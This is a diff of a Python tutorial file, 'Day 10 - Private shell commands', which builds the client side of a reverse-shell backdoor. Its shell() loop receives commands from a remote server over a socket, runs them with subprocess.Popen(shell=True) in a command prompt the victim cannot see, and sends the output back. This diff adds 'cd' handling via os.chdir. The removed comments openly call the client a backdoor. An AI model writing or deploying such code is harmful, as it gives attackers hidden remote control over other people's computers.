@@ -1,4 +1,4 @@
-# Day 9 - Creating the Shell
+# Day 10 - Private shell commands (COMMAND PROMPT)
 
 import socket
 import json
@@ -65,20 +65,20 @@ def message_recv(size=8):
 
 def shell():
     while True:
-        command = json_recv() # 9
-        if command == 'cd':
-            pass
+        command = json_recv()
+        if command[:3] == 'cd ':
+            os.chdir(command[3:]) # 5
         elif command == 'ls':
             pass
-        elif command == 'clear':
+        elif command == 'clear': # 6
             pass
         elif command == 'quit':
             break
-        else: # 10
-            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # 11
-            result = execute.stdout.read() + execute.stderr.read() # 11
-            result = result.decode() # 12
-            json_send(result) # 13
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            json_send(result)
 
 
 def connection():   
@@ -99,15 +99,9 @@ connection()
 
 ########################
 
-# 9     We are going to decode the given cxommand using the new functions json_send/json_recv
-# 10    if the client.py script does not receive any given commands from ['cd', 'ls',' 'clear', 'quit'],
-#       it will assume that there are another commands that is going to execute in the command prompt (windows)
-#       from the new module subprocess, we are going to open a command prompt from the client that is not visible by the client. (backdoor)
-#       please see the documentations of subprocess from this link https://docs.python.org/3/library/subprocess.html
-#       and whatever the result is going to assigned to the 'execute' variable
-# 11    now, in order to send it back to the server, we have to read the output from the invisible command prompt, and assign it to result.
-# 12    since it is encoded, we have to decode it first.
-# 13    and then we are going to send the output using json_send to back to the server
+# 5     since we took [:3] from the command -> 'cd ', we are sending to perform the change directory method from os module. and we are taking the [3:] of the input.
+#       ie. 'cd Downloads' -> os.chdir('Downloads') 
+# 6     since our monitor is in the server. this has nothing to do with the input. we are performing pass each time clear is in the input.
 
 ########################
 
